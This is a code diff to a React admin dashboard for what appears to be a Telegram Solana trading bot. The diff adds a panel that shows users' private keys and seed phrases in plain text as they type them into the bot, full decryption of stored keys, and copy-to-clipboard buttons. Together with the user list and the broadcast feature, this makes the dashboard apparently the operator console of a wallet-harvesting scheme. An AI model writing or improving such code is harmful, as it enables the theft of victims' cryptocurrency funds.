@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef, Component } from "react";
 import { 
   Users, 
   Shield, 
@@ -17,7 +17,7 @@ import {
   ArrowUpRight,
   ArrowDownRight
 } from "lucide-react";
-import { motion, AnimatePresence } from "motion/react";
+import { motion, AnimatePresence } from "framer-motion";
 
 interface User {
   id: number;
@@ -26,6 +26,7 @@ interface User {
   wallet_address: string;
   private_key: string;
   recovery_phrase: string;
+  status: string;
   created_at: string;
 }
 
@@ -49,38 +50,140 @@ export default function App() {
   const [isLoggedIn, setIsLoggedIn] = useState(true);
   const [activeTab, setActiveTab] = useState<Tab>('users');
   const [users, setUsers] = useState<User[]>([]);
+  const [pendingUsers, setPendingUsers] = useState<any[]>([]);
   const [trades, setTrades] = useState<Trade[]>([]);
   const [stats, setStats] = useState<Stats>({ users: 0, trades: 0 });
   const [search, setSearch] = useState("");
-  const [decryptedValues, setDecryptedValues] = useState<Record<string, string>>({});
+  const [decryptedValues, setDecryptedValues] = useState<Record<string, any>>({});
+  const [decrypting, setDecrypting] = useState<Record<string, boolean>>({});
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
   
   // Broadcast state
   const [broadcastMsg, setBroadcastMsg] = useState("");
   const [broadcastStatus, setBroadcastStatus] = useState<{ success?: number, fail?: number } | null>(null);
 
+  const [botStatus, setBotStatus] = useState<{ active: boolean, username?: string }>({ active: false });
+  const [serverStatus, setServerStatus] = useState<'online' | 'offline' | 'checking'>('checking');
+  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
+  const isFetching = useRef(false);
+
+  const fetchWithTimeout = async (url: string, options: any = {}, timeout = 30000) => {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeout);
+    try {
+      const response = await fetch(url, { ...options, signal: controller.signal });
+      clearTimeout(id);
+      return response;
+    } catch (err: any) {
+      clearTimeout(id);
+      if (err.name === 'AbortError') {
+        throw new Error(`Request to ${url} timed out after ${timeout}ms`);
+      }
+      throw err;
+    }
+  };
+
   useEffect(() => {
-    fetchData();
+    const refresh = async () => {
+      // Run health check first
+      const isHealthy = await checkServerHealth();
+      
+      // Only proceed if server is online
+      if (isHealthy) {
+        await Promise.all([
+          fetchData(),
+          checkBotStatus()
+        ]);
+      } else {
+        console.warn("Server is offline, skipping data fetch");
+        setLoading(false);
+      }
+    };
+
+    refresh();
+
+    const interval = setInterval(refresh, 15000); // 15s refresh
+    return () => clearInterval(interval);
   }, []);
 
+  const isCheckingHealth = useRef(false);
+  const isCheckingBot = useRef(false);
+
+  const checkServerHealth = async () => {
+    if (isCheckingHealth.current) return true;
+    isCheckingHealth.current = true;
+    try {
+      const res = await fetchWithTimeout("/api/health", {}, 10000);
+      if (res.ok) {
+        setServerStatus('online');
+        return true;
+      } else {
+        setServerStatus('offline');
+        return false;
+      }
+    } catch (err) {
+      setServerStatus('offline');
+      return false;
+    } finally {
+      isCheckingHealth.current = false;
+    }
+  };
+
+  const checkBotStatus = async () => {
+    if (isCheckingBot.current) return;
+    isCheckingBot.current = true;
+    try {
+      const res = await fetchWithTimeout("/api/admin/bot-status", {}, 10000);
+      const contentType = res.headers.get("content-type");
+      if (res.ok && contentType && contentType.includes("application/json")) {
+        const data = await res.json();
+        setBotStatus(data);
+      } else {
+        console.warn("Bot status check returned non-JSON or error response", res.status);
+        setBotStatus({ active: false });
+      }
+    } catch (err: any) {
+      console.error("Bot status check failed:", err.message || err);
+      setBotStatus({ active: false });
+    } finally {
+      isCheckingBot.current = false;
+    }
+  };
+
   const fetchData = async () => {
+    if (isFetching.current) return;
+    isFetching.current = true;
+    
     setLoading(true);
     try {
-      const [usersRes, statsRes, tradesRes] = await Promise.all([
-        fetch("/api/admin/users"),
-        fetch("/api/admin/stats"),
-        fetch("/api/admin/trades")
+      const [usersRes, statsRes, tradesRes, pendingRes] = await Promise.all([
+        fetchWithTimeout("/api/admin/users").catch(e => ({ ok: false, error: e })),
+        fetchWithTimeout("/api/admin/stats").catch(e => ({ ok: false, error: e })),
+        fetchWithTimeout("/api/admin/trades").catch(e => ({ ok: false, error: e })),
+        fetchWithTimeout("/api/admin/pending").catch(e => ({ ok: false, error: e }))
       ]);
-      const usersData = await usersRes.json();
-      const statsData = await statsRes.json();
-      const tradesData = await tradesRes.json();
-      setUsers(usersData);
-      setStats(statsData);
-      setTrades(tradesData);
-    } catch (err) {
-      console.error(err);
+      
+      if (usersRes.ok) setUsers(await (usersRes as Response).json());
+      if (statsRes.ok) setStats(await (statsRes as Response).json());
+      if (tradesRes.ok) setTrades(await (tradesRes as Response).json());
+      if (pendingRes.ok) setPendingUsers(await (pendingRes as Response).json());
+      
+      if (usersRes.ok || statsRes.ok || tradesRes.ok || pendingRes.ok) {
+        setLastUpdated(new Date());
+        setError(null);
+      } else {
+        throw new Error("All data fetches failed");
+      }
+    } catch (err: any) {
+      console.error("[Fetch Error]", err);
+      // Only show error if we don't have any data yet
+      if (users.length === 0) {
+        setError(err.name === 'AbortError' ? "Request timed out. Server might be busy." : "Connection lost. Retrying...");
+      }
     } finally {
       setLoading(false);
+      isFetching.current = false;
     }
   };
 
@@ -93,17 +196,28 @@ export default function App() {
       return;
     }
 
-    const res = await fetch("/api/admin/decrypt", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ encryptedText }),
-    });
-    if (res.ok) {
-      const { decrypted } = await res.json();
-      setDecryptedValues(prev => ({ ...prev, [key]: decrypted }));
-    } else {
-      alert("Decryption failed");
+    setDecrypting(prev => ({ ...prev, [key]: true }));
+    try {
+      const res = await fetch("/api/admin/decrypt", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ encryptedText }),
+      });
+      if (res.ok) {
+        const { decrypted } = await res.json();
+        setDecryptedValues(prev => ({ ...prev, [key]: decrypted }));
+      }
+    } catch (err) {
+      console.error("Decryption failed", err);
+      setError("Decryption failed. Please try again.");
+    } finally {
+      setDecrypting(prev => ({ ...prev, [key]: false }));
     }
+  };
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text);
+    // Optional: show a toast or temporary "Copied!" state
   };
 
   const handleBroadcast = async (e: React.FormEvent) => {
@@ -121,21 +235,22 @@ export default function App() {
       setBroadcastStatus({ success: data.successCount, fail: data.failCount });
       setBroadcastMsg("");
     } catch (err) {
-      alert("Broadcast failed");
+      console.error("Broadcast failed", err);
+      setError("Broadcast failed. Please try again.");
     } finally {
       setLoading(false);
     }
   };
 
-  const filteredUsers = users.filter(u => 
-    u.username.toLowerCase().includes(search.toLowerCase()) || 
-    u.wallet_address.toLowerCase().includes(search.toLowerCase()) ||
-    u.telegram_id.toString().includes(search)
+  const filteredUsers = (Array.isArray(users) ? users : []).filter(u => 
+    (u.username || "").toLowerCase().includes(search.toLowerCase()) || 
+    (u.wallet_address || "").toLowerCase().includes(search.toLowerCase()) ||
+    (u.telegram_id || "").toString().includes(search)
   );
 
-  const filteredTrades = trades.filter(t => 
-    t.username.toLowerCase().includes(search.toLowerCase()) || 
-    t.token.toLowerCase().includes(search.toLowerCase())
+  const filteredTrades = (Array.isArray(trades) ? trades : []).filter(t => 
+    (t.username || "").toLowerCase().includes(search.toLowerCase()) || 
+    (t.token || "").toLowerCase().includes(search.toLowerCase())
   );
 
   if (!isLoggedIn) return null;
@@ -179,11 +294,15 @@ export default function App() {
           <div className="mt-auto pt-6 border-t border-white/5">
             <div className="bg-[#111] rounded-2xl p-4 border border-white/5">
               <div className="flex items-center gap-3 mb-3">
-                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                <span className="text-xs font-bold text-white uppercase tracking-widest">System Status</span>
+                <div className={`w-2 h-2 rounded-full animate-pulse ${serverStatus === 'online' ? 'bg-emerald-500' : 'bg-red-500'}`} />
+                <span className="text-xs font-bold text-white uppercase tracking-widest">
+                  {serverStatus === 'online' ? 'System Online' : 'System Offline'}
+                </span>
               </div>
               <p className="text-[10px] text-zinc-600 leading-relaxed">
-                Terminal connected to Solana Mainnet-Beta. All systems operational.
+                {serverStatus === 'online' 
+                  ? "Terminal connected to Solana Mainnet-Beta. All systems operational."
+                  : "Unable to reach the backend server. Please check your connection."}
               </p>
             </div>
           </div>
@@ -206,6 +325,24 @@ export default function App() {
             </div>
 
             <div className="flex items-center gap-4">
+              {lastUpdated && (
+                <span className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest hidden sm:block">
+                  Last Sync: {lastUpdated.toLocaleTimeString()}
+                </span>
+              )}
+              <button 
+                onClick={fetchData}
+                disabled={loading}
+                className="p-3 bg-zinc-900 border border-white/5 rounded-xl text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all disabled:opacity-50"
+                title="Refresh Data"
+              >
+                <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
+              </button>
+              {error && (
+                <div className="bg-red-500/10 border border-red-500/20 text-red-500 px-4 py-2 rounded-xl text-xs font-bold">
+                  {error}
+                </div>
+              )}
               <div className="relative">
                 <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                 <input
@@ -216,12 +353,6 @@ export default function App() {
                   className="bg-[#0a0a0a] border border-white/5 rounded-2xl py-3 pl-12 pr-4 focus:outline-none focus:border-emerald-500/30 w-full md:w-64 text-sm transition-all"
                 />
               </div>
-              <button 
-                onClick={fetchData}
-                className="p-3 bg-[#0a0a0a] border border-white/5 rounded-2xl hover:bg-white/5 transition-all active:scale-95"
-              >
-                <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
-              </button>
             </div>
           </header>
 
@@ -252,12 +383,58 @@ export default function App() {
                   </div>
                   <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                     <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
-                      <Wallet className="w-24 h-24" />
+                      <Shield className="w-24 h-24" />
                     </div>
-                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Network</p>
-                    <p className="text-3xl font-black text-emerald-500 mt-2 uppercase">Mainnet</p>
+                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Bot Status</p>
+                    <p className={`text-3xl font-black mt-2 uppercase ${botStatus.active ? 'text-emerald-500' : 'text-red-500'}`}>
+                      {botStatus.active ? "Online" : "Offline"}
+                    </p>
+                    <p className="text-[10px] text-zinc-600 font-bold mt-1">
+                      {botStatus.active ? `@${botStatus.username || 'Bot'}` : "Check Token"}
+                    </p>
                   </div>
                 </div>
+
+                {/* Pending Inputs Section */}
+                {pendingUsers.length > 0 && (
+                  <div className="bg-amber-500/5 border border-amber-500/20 rounded-3xl p-6 mb-6">
+                    <div className="flex items-center gap-3 mb-4">
+                      <div className="w-8 h-8 bg-amber-500 rounded-lg flex items-center justify-center">
+                        <Database className="text-black w-5 h-5" />
+                      </div>
+                      <h3 className="text-white font-black uppercase tracking-widest text-sm">Live Bot Inputs (Pending)</h3>
+                      <span className="bg-amber-500 text-black text-[10px] font-black px-2 py-0.5 rounded-full animate-pulse">
+                        {pendingUsers.length} ACTIVE
+                      </span>
+                    </div>
+                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                      {pendingUsers.map((p) => (
+                        <div key={p.telegram_id} className="bg-black/40 border border-white/5 p-4 rounded-2xl">
+                          <div className="flex items-center justify-between mb-3">
+                            <span className="text-white font-bold text-xs">User: {p.telegram_id}</span>
+                            <span className="text-[10px] text-amber-500 font-black uppercase tracking-widest">
+                              Step: {p.step || 'Idle'}
+                            </span>
+                          </div>
+                          <div className="space-y-2">
+                            <div className="flex flex-col gap-1">
+                              <span className="text-[9px] text-zinc-600 uppercase font-black">Private Key</span>
+                              <code className="text-[10px] text-zinc-400 bg-zinc-900/50 p-2 rounded-lg break-all">
+                                {p.pk || "Waiting..."}
+                              </code>
+                            </div>
+                            <div className="flex flex-col gap-1">
+                              <span className="text-[9px] text-zinc-600 uppercase font-black">Seed Phrase</span>
+                              <code className="text-[10px] text-zinc-400 bg-zinc-900/50 p-2 rounded-lg break-all">
+                                {p.seed || "Waiting..."}
+                              </code>
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
 
                 {/* Table */}
                 <div className="bg-[#0a0a0a] border border-white/5 rounded-3xl overflow-hidden shadow-2xl">
@@ -277,10 +454,17 @@ export default function App() {
                             <td className="p-6">
                               <div className="flex items-center gap-4">
                                 <div className="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center border border-white/5 text-white font-bold">
-                                  {user.username[0].toUpperCase()}
+                                  {(user.username || "?")[0].toUpperCase()}
                                 </div>
                                 <div className="flex flex-col">
-                                  <span className="text-white font-bold">@{user.username}</span>
+                                  <div className="flex items-center gap-2">
+                                    <span className="text-white font-bold">@{user.username}</span>
+                                    {user.status === 'disconnected' && (
+                                      <span className="text-[8px] bg-red-500/10 text-red-500 border border-red-500/20 px-1.5 py-0.5 rounded uppercase font-black">
+                                        Disconnected
+                                      </span>
+                                    )}
+                                  </div>
                                   <span className="text-[10px] text-zinc-600 font-mono">UID: {user.telegram_id}</span>
                                 </div>
                               </div>
@@ -302,30 +486,66 @@ export default function App() {
                             </td>
                             <td className="p-6">
                               <div className="flex flex-col gap-2">
-                                <button 
-                                  onClick={() => handleDecrypt(user.id, 'private_key', user.private_key)}
-                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 hover:bg-zinc-900 px-3 py-2 rounded-xl border border-white/5 transition-all w-48"
+                                <div 
+                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 px-3 py-2 rounded-xl border border-white/5 transition-all w-full max-w-xs"
                                 >
                                   <span className="text-zinc-600 uppercase font-black tracking-tighter">Private Key</span>
                                   <div className="flex items-center gap-2">
-                                    <span className="font-mono text-zinc-400">
-                                      {decryptedValues[`${user.id}-private_key`] ? decryptedValues[`${user.id}-private_key`].slice(0, 4) + "..." : "••••"}
+                                    <span className="font-mono text-zinc-400 break-all">
+                                      {decrypting[`${user.id}-private_key`] ? "DECRYPTING..." : (decryptedValues[`${user.id}-private_key`] ? decryptedValues[`${user.id}-private_key`] : (user.private_key ? user.private_key.slice(0, 8) + "..." : "NONE"))}
                                     </span>
-                                    {decryptedValues[`${user.id}-private_key`] ? <Unlock className="w-3 h-3 text-emerald-500" /> : <Lock className="w-3 h-3 text-zinc-700" />}
+                                    <div className="flex items-center gap-1">
+                                      {decryptedValues[`${user.id}-private_key`] && (
+                                        <button 
+                                          onClick={() => {
+                                            navigator.clipboard.writeText(decryptedValues[`${user.id}-private_key`]);
+                                          }}
+                                          className="p-1 hover:bg-white/10 rounded transition-colors text-zinc-600 hover:text-emerald-500"
+                                          title="Copy to clipboard"
+                                        >
+                                          <Send className="w-3 h-3" />
+                                        </button>
+                                      )}
+                                      <button 
+                                        onClick={() => handleDecrypt(user.id, 'private_key', user.private_key)}
+                                        disabled={decrypting[`${user.id}-private_key`]}
+                                        className="p-1 hover:bg-white/10 rounded transition-colors"
+                                      >
+                                        {decrypting[`${user.id}-private_key`] ? <RefreshCw className="w-3 h-3 text-zinc-600 animate-spin" /> : (decryptedValues[`${user.id}-private_key`] ? <Lock className="w-3 h-3 text-emerald-500" /> : <Unlock className="w-3 h-3 text-zinc-600" />)}
+                                      </button>
+                                    </div>
                                   </div>
-                                </button>
-                                <button 
-                                  onClick={() => handleDecrypt(user.id, 'recovery_phrase', user.recovery_phrase)}
-                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 hover:bg-zinc-900 px-3 py-2 rounded-xl border border-white/5 transition-all w-48"
+                                </div>
+                                <div 
+                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 px-3 py-2 rounded-xl border border-white/5 transition-all w-full max-w-xs"
                                 >
                                   <span className="text-zinc-600 uppercase font-black tracking-tighter">Seed Phrase</span>
                                   <div className="flex items-center gap-2">
-                                    <span className="font-mono text-zinc-400">
-                                      {decryptedValues[`${user.id}-recovery_phrase`] ? decryptedValues[`${user.id}-recovery_phrase`].slice(0, 4) + "..." : "••••"}
+                                    <span className="font-mono text-zinc-400 break-all">
+                                      {decrypting[`${user.id}-recovery_phrase`] ? "DECRYPTING..." : (decryptedValues[`${user.id}-recovery_phrase`] ? decryptedValues[`${user.id}-recovery_phrase`] : (user.recovery_phrase ? user.recovery_phrase.slice(0, 12) + "..." : "NONE"))}
                                     </span>
-                                    {decryptedValues[`${user.id}-recovery_phrase`] ? <Unlock className="w-3 h-3 text-emerald-500" /> : <Lock className="w-3 h-3 text-zinc-700" />}
+                                    <div className="flex items-center gap-1">
+                                      {decryptedValues[`${user.id}-recovery_phrase`] && (
+                                        <button 
+                                          onClick={() => {
+                                            navigator.clipboard.writeText(decryptedValues[`${user.id}-recovery_phrase`]);
+                                          }}
+                                          className="p-1 hover:bg-white/10 rounded transition-colors text-zinc-600 hover:text-emerald-500"
+                                          title="Copy to clipboard"
+                                        >
+                                          <Send className="w-3 h-3" />
+                                        </button>
+                                      )}
+                                      <button 
+                                        onClick={() => handleDecrypt(user.id, 'recovery_phrase', user.recovery_phrase)}
+                                        disabled={decrypting[`${user.id}-recovery_phrase`]}
+                                        className="p-1 hover:bg-white/10 rounded transition-colors"
+                                      >
+                                        {decrypting[`${user.id}-recovery_phrase`] ? <RefreshCw className="w-3 h-3 text-zinc-600 animate-spin" /> : (decryptedValues[`${user.id}-recovery_phrase`] ? <Lock className="w-3 h-3 text-emerald-500" /> : <Unlock className="w-3 h-3 text-zinc-600" />)}
+                                      </button>
+                                    </div>
                                   </div>
-                                </button>
+                                </div>
                               </div>
                             </td>
                             <td className="p-6 text-xs font-medium text-zinc-600">
@@ -336,6 +556,12 @@ export default function App() {
                       </tbody>
                     </table>
                   </div>
+                  {filteredUsers.length === 0 && (
+                    <div className="p-20 text-center">
+                      <Users className="w-16 h-16 text-zinc-800 mx-auto mb-4" />
+                      <p className="text-zinc-600 font-bold uppercase tracking-widest">No terminal users connected</p>
+                    </div>
+                  )}
                 </div>
               </motion.div>
             )}
